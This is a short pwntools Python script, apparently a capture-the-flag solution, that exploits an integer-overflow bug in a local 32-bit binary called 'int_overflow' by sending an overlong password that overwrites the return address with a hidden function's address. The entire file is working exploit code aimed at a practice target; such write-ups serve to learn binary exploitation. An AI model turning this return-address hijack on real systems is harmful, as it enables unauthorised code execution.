# coding:UTF-8
# author:iopr

from pwn import *
context(os='linux',arch='i386')

Debug=1
if Debug:
    io=process('./int_overflow')
else:
    pass

buf=0xBFBB5F24
ret=0xBFBB5F3C
padding_count=263
elf=ELF('./int_overflow')

def main():
    io.recvuntil('Your choice:')
    io.sendline('1')
    io.recvuntil('Please input your username:\n')
    io.sendline('1')
    io.recvuntil('Please input your passwd:\n')
    io.sendline(((ret-buf)*'a'+p32(elf.symbols['what_is_this'])).ljust(padding_count,'a'))
    io.interactive()

main()